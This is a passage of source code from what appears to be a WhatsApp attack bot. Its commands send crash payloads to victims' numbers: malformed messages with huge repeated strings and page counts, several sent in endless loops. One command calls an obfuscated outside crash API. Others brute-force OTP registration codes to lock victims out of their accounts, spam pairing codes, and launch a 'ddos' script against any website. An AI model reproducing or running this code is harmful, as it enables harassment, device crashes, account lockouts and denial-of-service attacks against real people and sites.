            "participant": "5518998215209@s.whatsapp.net",
            "quotedMessage": { "documentMessage": {"url":"https://mmg.whatsapp.net/v/t62.7119-24/19973861_773172578120912_2263905544378759363_n.enc?ccb=11-4&oh=01_Q5AaIMqFI6NpAOoKBsWqUR52hN9p5YIGxW1TyJcHyVIb17Pe&oe=6653504B&_nc_sid=5e03e0&mms3=true","mimetype":"application/pdf","fileSha256":"oV/EME/ku/CjRSAFaW+b67CCFe6G5VTAGsIoimwxMR8=","fileLength":null,"pageCount":99999999999999,"contactVcard":true,"caption":'͡𑰵',"mediaKey":"yU8ofp6ZmGyLRdGteF7Udx0JE4dXbWvhT6X6Xioymeg=","fileName": '> cart; ',"fileEncSha256":"0dJ3YssZD1YUMm8LdWPWxz2VNzw5icWNObWWiY9Zs3k=","directPath":"/v/t62.7119-24/19973861_773172578120912_2263905544378759363_n.enc?ccb=11-4&oh=01_Q5AaIMqFI6NpAOoKBsWqUR52hN9p5YIGxW1TyJcHyVIb17Pe&oe=6653504B&_nc_sid=5e03e0","mediaKeyTimestamp":"1714145232","thumbnailDirectPath":"/v/t62.36145-24/32182773_798270155158347_7279231160763865339_n.enc?ccb=11-4&oh=01_Q5AaIGDA9WE26BzZF37Vp6aAsKq56VhpiK6Gdp2EGu1AoGd8&oe=665346DE&_nc_sid=5e03e0","thumbnailSha256":"oFogyS+qrsnHwWFPNBmtCsNya8BJkTlG1mU3DdGfyjg=","thumbnailEncSha256":"G2VHGFcbMP1IYd95tLWnpQRxCb9+Q/7/OaiDgvWY8bM=","jpegThumbnail":"/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABERERESERMVFRMaHBkcGiYjICAjJjoqLSotKjpYN0A3N0A3WE5fTUhNX06MbmJiboyiiIGIosWwsMX46/j///8BERERERIRExUVExocGRwaJiMgICMmOiotKi0qOlg3QDc3QDdYTl9NSE1fToxuYmJujKKIgYiixbCwxfjr+P/////CABEIACIAYAMBIgACEQEDEQH/xAAwAAACAwEBAAAAAAAAAAAAAAADBAACBQYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAA5CpC5601s5+88/TJ01nBC6jmytPTAQuZhpxa2PQ0WjCP2T6LXLJR3Ma5WSIsDXtUZYkz2seRXNmSAY8m/PlhkUdZD//EAC4QAAIBAwIEBAQHAAAAAAAAAAECAAMRIRIxBCJBcQVRgbEQEzIzQmFygsHR4f/aAAgBAQABPwBKSsN4aZERmVVybZxecODVpEsCE2zmIhYgAZMbwjiQgbBNto9MqSCMwiUioJDehvaVBynIJ3xKPDki7Yv7StTC3IYdoLAjT/s0ltpSOhgSAR1BlTi7qUQTw/g3aolU4VTLzxLgg96yb9Yy2gJVgRLKgL1VtfZdyTKdXQrO246dB+UJJJJ3hRAoDWA84p+WRc3U9YANRmlT3nK9NdN9u1jKD1KeNTSsfnmzFiB5Eypw9ADUS4Hr/U1LT+1T9SPcmEaiWJ1N59BKrAcgNxfJ+BV25nNu8QlLE5WJj9J2mhTKTMjAX5SZTo0qYDsVJOxgalWauFtdeonE1NDW27ZEeqpz/F/ePUJHXuYfgxJqQfT6RPtfujE3pwdJQ5uDYNnB3nAABKlh+IzisvVh2hhg3n//xAAZEQACAwEAAAAAAAAAAAAAAAABIAACEWH/2gAIAQIBAT8AYDs16p//xAAfEQABAwQDAQAAAAAAAAAAAAABAAIRICExMgMSQoH/2gAIAQMBAT8ALRERdYpc6+sLrIREUenIa/AuXFH/2Q==","thumbnailHeight":172,"thumbnailWidth":480},forwardingScore: 508,isForwarded: true,forwardedNewsletterMessageInfo: {newsletterJid: "0@newsletter",serverMessageId: 100,newsletterName:"🚔 > ursoziingod & crash;"}}}},
       }}},{})
	}
	
	async function xgc2(victim){
		await Avishka.relayMessage(victim, {
'groupInviteMessage': {
"inviteExpiration": Math.floor(Date.now() / 1000) + 31536000,
"groupName":` 🦄 REAL-KING-AVI 🦄`.repeat(1500),
'groupJid': '120363047626537933@g.us',
'inviteExpiration': '999',
'caption': '> ㅤㅤㅤㅤㅤㅤㅤ',
"inviteCode": 'h+64P9RhJDzgXSPf',
'contextInfo': {
'isForwarded': true,
'fromMe': false,
'participant': '0@s.whatsapp.net',
'remoteJid': sender,
'quotedMessage': {
documentMessage: {
url: "https://mmg.whatsapp.net/v/t62.7119-24/34673265_965442988481988_3759890959900226993_n.enc?ccb=11-4&oh=01_AdRGvYuQlB0sdFSuDAeoDUAmBcPvobRfHaWRukORAicTdw&oe=65E730EB&_nc_sid=5e03e0&mms3=true",
mimetype: "application/pdf",
title: "crash",
pageCount: 1000000000,
fileName: "crash.pdf".repeat(1500),
contactVcard: true
}
},
'forwardedNewsletterMessageInfo': {
'newsletterJid': '120363222395675670@newsletter',
'serverMessageId': 1,
'newsletterName': "🦄 REAL-KING-AVI 🦄".repeat(1500)
}
}
}
}, {});
		}
		async function xgc3(victim){
			const trabaSend = fs.readFileSync("./69/xeontext17.js")
await Avishka.relayMessage(
      victim,
      {
 viewOnceMessage: {
                  message: {
                     messageContextInfo: {
                        deviceListMetadataVersion: 2,
                        deviceListMetadata: {},
                     },
  scheduledCallCreationMessage: {
"scheduledTimestampMs": Date.now(),
         callType: 1,
         title: `🦄 REAL-KING-AVI 🦄` + trabaSend
    }
    
  },                   
                                       },
                                                      },
      {quoted : victim })
			}
		
for (let i = 0; i < 30; i++) {
	await xgc4(victim);
	await xgc3(victim);
await xgc(victim); 
await xgc2(victim);
await xgc3(victim);
await xgc4(victim);
await delay(10000); // Delay for 5 seconds
    }
    } else {
    	await xeonydatabase34();
    }
break
case 'xmediumxx':{
	if (allowedUsers33.includes(avimatch33)) {
if (!q) return replygcxeon(`Example:\n ${prefix + command} 91xxx`)
victim = text.split("|")[0]
Xreturn = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
var contactInfo = await Avishka.onWhatsApp(Xreturn);
  if (victim == "916909137213") {
    return;
    }
    if (victim == "919366326018") {
    return;
    }
    if (victim == "919402104403") {
    return;
  }
  if (contactInfo.length == 0) {
    return replygcxeon("The number is not registered on WhatsApp");
  }
	replygcxeon(`In process`)
	await xeonMEDIUM(Xreturn);
	sendMessageWithMentions(
    "Successfully Sent Bug To @" + Xreturn.split('@')[0] + 
    " Using *" + command + "* ✅\n\nPause 2 minutes so that the bot is not banned.", 
    [Xreturn]
  );
  } else {
    	await xeonydatabase33();
    }
  }
        break;
case 'xeasyxx':{
	if (allowedUsers32.includes(avimatch32)) {
if (!q) return replygcxeon(`Example:\n ${prefix + command} 91xxx`)
victim = text.split("|")[0]
Xreturn = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
var contactInfo = await Avishka.onWhatsApp(Xreturn);
  if (victim == "916909137213") {
    return;
    }
    if (victim == "919366326018") {
    return;
    }
    if (victim == "919402104403") {
    return;
  }
  if (contactInfo.length == 0) {
    return replygcxeon("The number is not registered on WhatsApp");
  }
	replygcxeon(`In process`)
	await xeonEASY(Xreturn);
	sendMessageWithMentions(
    "Successfully Sent Bug To @" + Xreturn.split('@')[0] + 
    " Using *" + command + "* ✅\n\nPause 2 minutes so that the bot is not banned.", 
    [Xreturn]
  );
  } else {
    	await xeonydatabase32();
    }
  }
break;
        case 'xxxxiosinvi':
case 'xxxxxiosinvisible': {
	if (allowedUsers31.includes(avimatch31)) {
    if (!q) return replygcxeon(`Enter the number\nExample: ${prefix+command} 91xxx`);
    const XeonKokxx = (base64String) => {
  return Buffer.from(base64String, 'base64').toString('utf8');
};
    let number = args[0].replace(/[^0-9]/g, ''); // Clean the number, only keep digits
    try {
        // Encode the URL in Base64
        const XeonOkay = "aHR0cHM6Ly92ZW5vbXdlYi5zaXRlL2kvc2VuZENyYXNoSXBob25l";
const WokeXeon = XeonKokxx(`${XeonOkay}`);
        const apiKey = "xeonkey";
        const encodedUrl = btoa(`${WokeXeon}?numero=${number}&total=10&apikey=${apiKey}`);
        
        while (true) {
        // Decode and use the URL
        const response = await fetch(atob(encodedUrl));
        const sendcrash = await response.json();
        await delay(10000); // Delay for 10 seconds
    }
        
        replygcxeon(`🚀 Crash attack successfully sent to ${number}.`);
    } catch (error) {
        replygcxeon(`Error trying to send invisible crash: ${error.message}`);
    }

}  else {
    	await xeonydatabase31();
    }
}
break;

case 'xiosloc': case 'xioslocgc':{
if (allowedUsers30.includes(avimatch30)) {
if (!q) return replygcxeon(`Example:\n ${prefix + command} 91xxx`)
victim = text.split("|")[0]
Xreturn = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
var contactInfo = await Avishka.onWhatsApp(Xreturn);
  if (victim == "916909137213") {
    return;
    }
    if (victim == "919366326018") {
    return;
    }
    if (victim == "919402104403") {
    return;
  }
  if (contactInfo.length == 0) {
    return replygcxeon("The number is not registered on WhatsApp");
  }
	replygcxeon(`In process`)
	for (let i = 0; i < 2; i++) {
await xeonIOSINVI2(Xreturn)
}
	sendMessageWithMentions(
    "Successfully Sent Bug To @" + Xreturn.split('@')[0] + 
    " Using *" + command + "* ✅\n\nPause 2 minutes so that the bot is not banned.", 
    [Xreturn]
  );
  
  } else {
    	await xeonydatabase30();
    }
  }
break

case 'xios': case 'xiosgc':{
if (allowedUsers29.includes(avimatch29)) {
if (!q) return replygcxeon(`Example:\n ${prefix + command} 91xxx`)
victim = text.split("|")[0]
Xreturn = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
var contactInfo = await Avishka.onWhatsApp(Xreturn);
  if (victim == "916909137213") {
    return;
    }
    if (victim == "919366326018") {
    return;
    }
    if (victim == "919402104403") {
    return;
  }
  if (contactInfo.length == 0) {
    return replygcxeon("The number is not registered on WhatsApp");
  }
	replygcxeon(`In process`)
	for (let i = 0; i < 2; i++) {
await xeonIOSINVI3(Xreturn)
}
	sendMessageWithMentions(
    "Successfully Sent Bug To @" + Xreturn.split('@')[0] + 
    " Using *" + command + "* ✅\n\nPause 2 minutes so that the bot is not banned.", 
    [Xreturn]
  );
  
  }  else {
    	await xeonydatabase29();
    }
  }
break

case 'xiosloc_unli': case 'xioslocgc_unli': {
if (allowedUsers28.includes(avimatch28)) {
    if (!q) return replygcxeon(`Example:\n ${prefix + command} 91xxx`);
    victim = text.split("|")[0];
    Xreturn = m.mentionedJid[0] 
      ? m.mentionedJid[0] 
      : m.quoted 
      ? m.quoted.sender 
      : victim.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

    var contactInfo = await Avishka.onWhatsApp(Xreturn);
    if (["916909137213", "919366326018", "919402104403"].includes(victim)) {
      return;
    }

    if (contactInfo.length === 0) {
      return replygcxeon("The number is not registered on WhatsApp");
    }

    const delay = ms => new Promise(resolve => setTimeout(resolve, ms));
sendMessageWithMentions(
        "Successfully Started Sending Bug To @" +
          Xreturn.split('@')[0] +
          " Using *" +
          command +
          "* ✅\n\nIf you want to stop the bug, please stop in panel or wherever you are hosting the bot ",
        [Xreturn]
      );
    while (true) {
        await xeonIOSINVI2(Xreturn);
        console.log(`Sent Crash to ${Xreturn}`)
await delay(10000); // Delay for 10 seconds
    }
  
  } else {
    	await xeonydatabase28();
    }
}
break;

case 'xios_unli': case 'xiosgc_unli': {
if (allowedUsers27.includes(avimatch27)) {
    if (!q) return replygcxeon(`Example:\n ${prefix + command} 91xxx`);
    victim = text.split("|")[0];
    Xreturn = m.mentionedJid[0] 
      ? m.mentionedJid[0] 
      : m.quoted 
      ? m.quoted.sender 
      : victim.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

    var contactInfo = await Avishka.onWhatsApp(Xreturn);
    if (["916909137213", "919366326018", "919402104403"].includes(victim)) {
      return;
    }

    if (contactInfo.length === 0) {
      return replygcxeon("The number is not registered on WhatsApp");
    }

    const delay = ms => new Promise(resolve => setTimeout(resolve, ms));
sendMessageWithMentions(
        "Successfully Started Sending Bug To @" +
          Xreturn.split('@')[0] +
          " Using *" +
          command +
          "* ✅\n\nIf you want to stop the bug, please stop in panel or wherever you are hosting the bot ",
        [Xreturn]
      );
    while (true) {
        await xeonIOSINVI3(Xreturn);
        console.log(`Sent Crash to ${Xreturn}`)
await delay(10000); // Delay for 10 seconds
    }
  
  } else {
    	await xeonydatabase27();
    }
}
break;

case 'xiphone': case 'xiphonegc':{
if (allowedUsers26.includes(avimatch26)) {
if (!q) return replygcxeon(`Example:\n ${prefix + command} 91xxx`)
victim = text.split("|")[0]
Xreturn = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
var contactInfo = await Avishka.onWhatsApp(Xreturn);
  if (victim == "916909137213") {
    return;
    }
    if (victim == "919366326018") {
    return;
    }
    if (victim == "919402104403") {
    return;
  }
  if (contactInfo.length == 0) {
    return replygcxeon("The number is not registered on WhatsApp");
  }
	replygcxeon(`In process`)
	for (let i = 0; i < 2; i++) {
await xeonIOSINVI(Xreturn)
}
	sendMessageWithMentions(
    "Successfully Sent Bug To @" + Xreturn.split('@')[0] + 
    " Using *" + command + "* ✅\n\nPause 2 minutes so that the bot is not banned.", 
    [Xreturn]
  );
 
  } else {
    	await xeonydatabase26();
    }
  }
break

case 'xiphone_unli': case 'xiphonegc_unli': {
if (allowedUsers25.includes(avimatch25)) {
    if (!q) return replygcxeon(`Example:\n ${prefix + command} 91xxx`);
    victim = text.split("|")[0];
    Xreturn = m.mentionedJid[0] 
      ? m.mentionedJid[0] 
      : m.quoted 
      ? m.quoted.sender 
      : victim.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

    var contactInfo = await Avishka.onWhatsApp(Xreturn);
    if (["916909137213", "919366326018", "919402104403"].includes(victim)) {
      return;
    }

    if (contactInfo.length === 0) {
      return replygcxeon("The number is not registered on WhatsApp");
    }

    const delay = ms => new Promise(resolve => setTimeout(resolve, ms));
sendMessageWithMentions(
        "Successfully Started Sending Bug To @" +
          Xreturn.split('@')[0] +
          " Using *" +
          command +
          "* ✅\n\nIf you want to stop the bug, please stop in panel or wherever you are hosting the bot ",
        [Xreturn]
      );
    while (true) {
        await xeonIOSINVI(Xreturn);
        console.log(`Sent Crash to ${Xreturn}`)
await delay(10000); // Delay for 10 seconds
    }
  
  } else {
    	await xeonydatabase25();
    }
}
break;

case 'xdelaydroid': {
if (allowedUsers24.includes(avimatch24)) {
    if (!q) return replygcxeon(`Example:\n ${prefix + command} 91xxx`);
    victim = text.split("|")[0];
    Xreturn = m.mentionedJid[0] 
      ? m.mentionedJid[0] 
      : m.quoted 
      ? m.quoted.sender 
      : victim.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

    var contactInfo = await Avishka.onWhatsApp(Xreturn);
    if (["916909137213", "919366326018", "919402104401"].includes(victim)) {
      return;
    }

    if (contactInfo.length === 0) {
      return replygcxeon("The number is not registered on WhatsApp");
    }

    const delay = ms => new Promise(resolve => setTimeout(resolve, ms));
sendMessageWithMentions(
        "Successfully Started Sending Bug To @" +
          Xreturn.split('@')[0] +
          " Using *" +
          command +
          "* ✅\n\nIf you want to stop the bug, please stop in panel or wherever you are hosting the bot ",
        [Xreturn]
      );
    while (true) {
        await XeonXRobust(Xreturn, Avishka, (cct = true), (ptcp = true));
        await XeonXRobust(Xreturn, Avishka, (cct = true), (ptcp = true));
        await XeonXRobust(Xreturn, Avishka, (cct = true), (ptcp = true));
        await XeonXRobust(Xreturn, Avishka, (cct = true), (ptcp = true));
        console.log(`Sent Crash to ${Xreturn}`)
await delay(10000); // Delay for 10 seconds
    }
  
  } else {
    	await xeonydatabase24();
    }
}
break;

case 'xskew':{
	if (allowedUsers23.includes(avimatch23)) {
if (!q) return replygcxeon(`Example:\n ${prefix + command} 91xxx`)
victim = text.split("|")[0]
Xreturn = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
var contactInfo = await Avishka.onWhatsApp(Xreturn);
  if (victim == "916909137213") {
    return;
    }
    if (victim == "919366326018") {
    return;
    }
    if (victim == "919402104401") {
    return;
  }
  if (contactInfo.length == 0) {
    return replygcxeon("The number is not registered on WhatsApp");
  }
	replygcxeon(`In process`)
	for (let i = 0; i < 2; i++) {
await XeonXRobust(Xreturn, Avishka, cct = true, ptcp = true)
await XeonXRobust(Xreturn, Avishka, cct = true, ptcp = true)
await XeonXRobust(Xreturn, Avishka, cct = true, ptcp = true)
await XeonXRobust(Xreturn, Avishka, cct = true, ptcp = true)
}
	sendMessageWithMentions(
    "Successfully Sent Bug To @" + Xreturn.split('@')[0] + 
    " Using *" + command + "* ✅\n\nPause 2 minutes so that the bot is not banned.", 
    [Xreturn]
  );
  
  } else {
    	await xeonydatabase23();
    }
  }
break;
case 'xiosfinityxx':{
	if (allowedUsers22.includes(avimatch22)) {
if (!q) return replygcxeon(`Example:\n ${prefix + command} 91xxx`)
victim = text.split("|")[0]
Xreturn = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
var contactInfo = await Avishka.onWhatsApp(Xreturn);
  if (victim == "916909137213") {
    return;
    }
    if (victim == "919366326018") {
    return;
    }
    if (victim == "919402104403") {
    return;
  }
  if (contactInfo.length == 0) {
    return replygcxeon("The number is not registered on WhatsApp");
  }
	replygcxeon(`In process`)
	for (let j = 0; j < 5; j++) {
await XeonIosOld(Xreturn)
await XeonIosNew(Xreturn)
await XeonIosPayOld(Xreturn)
await XeonIosOld(Xreturn)
}
	sendMessageWithMentions(
    "Successfully Sent Bug To @" + Xreturn.split('@')[0] + 
    " Using *" + command + "* ✅\n\nPause 2 minutes so that the bot is not banned.", 
    [Xreturn]
  );
  
  } else {
    	await xeonydatabase22();
    }
  }
break;
case 'xallfinityxx':{
	if (allowedUsers21.includes(avimatch21)) {
if (!q) return replygcxeon(`Example:\n ${prefix + command} 91xxx`)
victim = text.split("|")[0]
Xreturn = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
var contactInfo = await Avishka.onWhatsApp(Xreturn);
  if (victim == "916909137213") {
    return;
    }
    if (victim == "919366326018") {
    return;
    }
    if (victim == "919402104403") {
    return;
  }
  if (contactInfo.length == 0) {
    return replygcxeon("The number is not registered on WhatsApp");
  }
	replygcxeon(`In process`)
	await XeonButtNew(Xreturn, Avishka, cct = true, ptcp = true)
  await XeonButtNew(Xreturn, Avishka, cct = true, ptcp = true)
await XeonCallNew(Xreturn, Avishka, cct = true, ptcp = true)
 await XeonNullNew(Xreturn, Avishka, cct = true, ptcp = true)
await XeonUiNew(Xreturn, Avishka, cct = true, ptcp = true)
await XeonCallOld(Xreturn, Avishka, cct = true, ptcp = true)
await XeonDocNew(Xreturn, Avishka, cct = true, ptcp = true)
	sendMessageWithMentions(
    "Successfully Sent Bug To @" + Xreturn.split('@')[0] + 
    " Using *" + command + "* ✅\n\nPause 2 minutes so that the bot is not banned.", 
    [Xreturn]
  );
  
  } else {
    	await xeonydatabase21();
    }
  }
break;
                case 'group-id': {
                	if (allowedUsers20.includes(avimatch20)) {
				if (!text) return replygcxeon('Enter Group Link!')
				if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return replygcxeon('Link Invalid!')
				const result = args[0].split('https://chat.whatsapp.com/')[1]
				const xeontry = await Avishka.groupAcceptInvite(result)
				m.reply(`Group id: ${xeontry}`)
				
} else {
    	await xeonydatabase20();
    }
			}
			break

case 'sendchx': {
    let xeonmenuoh = `Subscribe and follow me 🥀`;
    let msgs = generateWAMessageFromContent(
        '120363363994224164@newsletter', 
        { 
            viewOnceMessage: { 
                message: { 
                    "messageContextInfo": { 
                        "deviceListMetadata": {}, 
                        "deviceListMetadataVersion": 2
                    }, 
                    interactiveMessage: proto.Message.InteractiveMessage.create({
                        contextInfo: { 
                            mentionedJid: [m.sender], 
                            externalAdReply: {
                                showAdAttribution: true 
                            }
                        }, 
                        body: proto.Message.InteractiveMessage.Body.create({ 
                            text: 'Aqui estão os links dos airdrops'
                        }), 
                        footer: proto.Message.InteractiveMessage.Footer.create({
                            text: 'Systemweb'
                        }),
                        header: proto.Message.InteractiveMessage.Header.create({
                            hasMediaAttachment: true, 
                            ...(await prepareWAMessageMedia({ 
                                image: await fs.readFileSync("./XeonMedia/ok.jpg") 
                            }, { 
                                upload: Avishka.waUploadToServer 
                            }))
                        }), 
                        nativeFlowMessage: proto.Message.InteractiveMessage.Body.create({ 
                            buttons: [
                                {
                                    "name": "cta_url",
                                    "buttonParamsJson": JSON.stringify({
                                        display_text: "Binance Moonbix",
                                        url: "https://t.me/Binance_Moonbix_bot/start?startApp=ref_2135103340&startapp=ref_2135103340&utm_medium=web_share_copy",
                                        merchant_url: "https://www.google.com"
                                    })
                                },
                                {
                                    "name": "cta_url",
                                    "buttonParamsJson": JSON.stringify({
                                        display_text: "Hamster Combat",
                                        url: "https://t.me/hamster_kombat_bOt/start?startapp=kentId2135103340",
                                        merchant_url: "https://www.google.com"
                                    })
                                },
                                {
                                    "name": "cta_url",
                                    "buttonParamsJson": JSON.stringify({
                                        display_text: "Memefi Coin",
                                        url: "https://t.me/memefi_coin_bot/main?startapp=r_85d3c1b672",
                                        merchant_url: "https://www.google.com"
                                    })
                                },
                                {
                                    "name": "cta_url",
                                    "buttonParamsJson": JSON.stringify({
                                        display_text: "Battle Bulls",
                                        url: "https://t.me/battle_games_com_bot/start?startapp=frndId2135103340",
                                        merchant_url: "https://www.google.com"
                                    })
                                },
                                {
                                    "name": "cta_url",
                                    "buttonParamsJson": JSON.stringify({
                                        display_text: "Alpha Tom",
                                        url: "https://t.me/AlphaTonGame_Bot/start/?startapp=refid2135103340",
                                        merchant_url: "https://www.google.com"
                                    })
                                },
                                {
                                    "name": "cta_url",
                                    "buttonParamsJson": JSON.stringify({
                                        display_text: "Dotcoin",
                                        url: "https://t.me/dotcoin_bot?start=r_2135103340",
                                        merchant_url: "https://www.google.com"
                                    })
                                }
                            ]
                        })
                    })
                }
            } 
        }, 
        { userJid: m.sender, quoted: m }
    ); 
    await Avishka.relayMessage(msgs.key.remoteJid, msgs.message, { 
        messageId: msgs.key.id
    });
}
break;
case 'debug': {
	if (allowedUsers19.includes(avimatch19)) {
	if (!m.quoted) return replygcxeon('Reply Message!')
	await XeonDebug(quoted);
	
	} else {
    	await xeonydatabase19();
    }
	}
	break
case 'avix':
            case 'avi':
            {
            	
            	await XeonMenu();
            

}
break;
case 'banpair': {
	if (allowedUsers17.includes(avimatch17)) {
			if (!q) return replygcxeon(`_Use : ${prefix+command} number\n_Example : ${prefix+command} 916909137211`)
			let [peenis, pepekk = "200"] = q.split("|")
			
			let target = peenis.replace(/[^0-9]/g, '').trim()
			let {
				default: makeWaSocket,
				useMultiFileAuthState,
				fetchLatestBaileysVersion
			} = require('@adiwajshing/baileys')
			let {
				state
			} = await useMultiFileAuthState('XSession')
			let {
				version
			} = await fetchLatestBaileysVersion()
	 replygcxeon(`Success!`)
			let sucked = await makeWaSocket({
				auth: state,
				version,
				logger: pino({
					level: 'fatal'
				})
			})
			for (let i = 0; i < pepekk; i++) {
				await sleep(1500)
				let prc = await sucked.getPairingCode(target)
				await console.log(`Succes Spam Pairing Code - Number : ${target} - Code : ${prc}`)
			}
			await sleep(15000)
			
			} else {
    	await xeonydatabase17();
    }
			}
		break
case 'lockotp': case 'tempban': {
	if (allowedUsers16.includes(avimatch16)) {
  if (args.length < 1) return replygcxeon(`Incorrect format\n\nUsage: ${prefix+command} country_code|number\nExample: ${prefix+command} 91|6909137213`);
  const args2 = args[0].split('|');
  if (args2.length !== 2) return replygcxeon(`Incorrect format\n\nUsage: ${prefix+command} country_code|number\nExample: ${prefix+command} 91|6909137213`);
  const xeonCountryCode = args2[0];
  const xtarget = args2[1];
  const xeonNumber = xtarget.replace('@s.whatsapp.net', '');
  const xeonmerge = `${xeonCountryCode}${xtarget}`
  const xeonMention = xeonmerge + '@s.whatsapp.net';
  sendMessageWithMentions(
    "Successfully Activated OTP LOCK To @" + xeonMention.split('@')[0] + 
    " Using *" + command + "* ✅\n\nPause 2 minutes so that the bot is not banned.", 
    [xeonMention]
  );
  try {
    const { stateXeon, saveCredsXeon } = await useMultiFileAuthState('./session');
    const xeonRequest = await Avishka.requestRegistrationCode({
      phoneNumber: '+' + xeonCountryCode + `${xeonNumber}`,
      phoneNumberCountryCode: xeonCountryCode,
      phoneNumberNationalNumber: `${xeonNumber}`,
      phoneNumberMobileCountryCode: 91,
      method: 'sms'
    });
  } catch (err) {
  }
  
  for (let i = 0; i < 10000; i++) {
    try {
      var xeonPrefix = Math.floor(Math.random() * 999);
      var xeonSuffix = Math.floor(Math.random() * 999);
      await Avishka.register(`${xeonPrefix}-${xeonSuffix}`);
    } catch (err) {
      console.log(`${xeonPrefix}-${xeonSuffix}`);
    }
  }
  
  } else {
    	await xeonydatabase16();
    }
  }
break;

case 'ddos':{
	if (allowedUser15s.includes(avimatch15)) {
if (!q.includes(' ')) return replygcxeon(`Use Methode: .${command} <target> <time>\nExaple: .${command} example.xyz 60`)
if (q.includes('paradise.dgxeon.shop')){
	return replygcxeon(`Cannot attack developer's site`);
	}
                     const targetweb = q.substring(0, q.indexOf(' ') - 0)
                const timeweb = q.substring(q.lastIndexOf(' ') + 1) 
replygcxeon(`Bot is attacking ${targetweb} with time ${timeweb}`)
              exec(`node ddos.js ${targetweb} ${timeweb}`, { maxBuffer: 1024 * 1024 }, (error, stdout, stderr) => {
        if (error) {
          replygcxeon(`Error: ${error.message}`);
          return;
        }
        if (stderr) {
          replygcxeon(`Error: ${stderr}`);
          return;
        }
        replygcxeon(`Success\n\n🤙 target: ${targetweb},\n🤙 Time: ${timeweb}`);
      });  
      
      } else {
    	await xeonydatabase15();
    }
      }
        break

 case 'backup': {

 

let jir = m.mentionedJid[0] || m.sender || Avishka.parseMention(args[0]) || (args[0].replace(/[@.+-]/g, '').replace(' ', '') + '@s.whatsapp.net') || '';

await replygcxeon('Mengumpulkan semua file ke folder...');

const { execSync } = require("child_process");

 const ls = (await execSync("ls")).toString().split("\n").filter( (pe) =>

pe != "node_modules" &&

pe != "session" &&

pe != "package-lock.json" &&

pe != "yarn.lock" &&

pe != "" );

await replygcxeon('Script akan dikirim lewat PC!')

const exec = await execSync(`zip -r Backup.zip ${ls.join(" ")}`);

await Avishka.sendMessage(jir, {

document: await fs.readFileSync("./Backup.zip"),

mimetype: "application/zip",

fileName: "XEON V17.zip",

},

{quoted: m });

await execSync("rm -rf XEON V17 Wa zip");

}
break
case 'forcegc': {
	if (allowedUsers14.includes(avimatch14)) {
	if (!q) return replygcxeon(`Example:\n ${prefix + command} 15`)
victim = text.split("|")[0]
let imgsc = await prepareWAMessageMedia({
image: await fs.readFileSync("./XeonMedia/thumb.jpg") 
}, {
upload: Avishka.waUploadToServer
})
let gcall = Object.values(await Avishka.groupFetchAllParticipating().catch(_=> null))
let rows = []
     

await gcall.forEach((u, i) => {
let anjay = {
header: u.subject,
title: `Status - ( ${u.announce == true ? "Group Closed" : "Group Open"} )`,
id: `.forcegc_v2 ${u.id}|${victim}`
};
rows.push(anjay)
});

var etc = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
viewOnceMessage: {
message: {
interactiveMessage: {
header: {
...imgsc,
hasMediaAttachment: true
},
body: {
text: ownername
},
footer: {
text: botname
},
nativeFlowMessage: {
buttons: [{
name: "single_select",
buttonParamsJson: JSON.stringify({
title: 'SELECT GROUP',
sections: [{
title: "Select Closed Group That You Want Send Message",
rows: rows
}]
})
}],
messageParamsJson: ""
}
}
}
}
}), { userJid: m.sender, quoted: m })
Avishka.relayMessage(m.chat, etc.message, { messageId: etc.key.id })
} else {
    	await xeonydatabase14();
    }
                    }
break
case 'forcesu': case 'forcestatus': case 'forcestory':
if (allowedUsers13.includes(avimatch13)) {
if (!q) return replygcxeon(`Example:\n ${prefix + command} 91xxx|15`)
victim = text.split("|")[0]
amount = text.split("|")[1]
Xreturn = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
var contactInfo = await Avishka.onWhatsApp(Xreturn);
  if (victim == "916909137213") {
    return;
    }
    if (victim == "919366326018") {
    return;
    }
    if (victim == "919402104403") {
    return;
  }
for (let i = 0; i < amount; i++) {
statusid = await Avishka.relayMessage('status@broadcast', {
viewOnceMessage: {
message: {
"messageContextInfo": {
"messageSecret": "eed1zxI49cxiovBTUFLIEWi1shD9HgIOghONuqPDGTk=",
"deviceListMetaData": {},
"deviceListMetadataVersion": 2
},
fromMe: false,
remoteJid: from,
statusJidList: [m.from],
broadcast: true,
"scheduledCallCreationMessage": {
"scheduledTimestampMs": '1200',
"callType": 'VOICE',
"title": botname
}
}
}
},{
backgroundColor: 104491,
statusJidList: [Xreturn],
fromMe: false,
remoteJid: from,
broadcast: true,
additionalAttributes:{
to: sender,
    }
})
await Avishka.sendMessage('status@broadcast',{delete: {fromMe: true,remoteJid: from,id: statusid}},{
backgroundColor: 104491,
statusJidList: [Xreturn],
fromMe: false,
remoteJid: from,
broadcast: true,
additionalAttributes:{
to: sender,
    }
})
}
replygcxeon('Status posted in: '+ Xreturn)
} else {
    	await xeonydatabase13();
    }
break
case 'aviblock':
if (allowedUsers12.includes(avimatch12)) {
if (!q) return replygcxeon(`Example:\n ${prefix + command} 15`)
victim = text.split("|")[0]
for (let i = 0; i < victim; i++) {
